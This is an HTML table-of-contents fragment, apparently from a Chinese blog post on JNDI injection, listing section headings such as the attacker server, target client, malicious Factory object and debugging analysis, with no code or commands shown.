+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI概念"><span class="toc-number">1.</span> <span class="toc-text">JNDI概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI注入"><span class="toc-number">2.</span> <span class="toc-text">JNDI注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Server端（攻击者）"><span class="toc-number">2.1.</span> <span class="toc-text">Server端（攻击者）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Client端（被攻击目标）"><span class="toc-number">2.2.</span> <span class="toc-text">Client端（被攻击目标）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#恶意Factory对象"><span class="toc-number">2.3.</span> <span class="toc-text">恶意Factory对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击结果"><span class="toc-number">2.4.</span> <span class="toc-text">攻击结果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#调试分析"><span class="toc-number">3.</span> <span class="toc-text">调试分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#结尾"><span class="toc-number">4.</span> <span class="toc-text">结尾</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考文章"><span class="toc-number">5.</span> <span class="toc-text">参考文章</span></a></li></ol>
                     </div>
                 </span>
             </div>
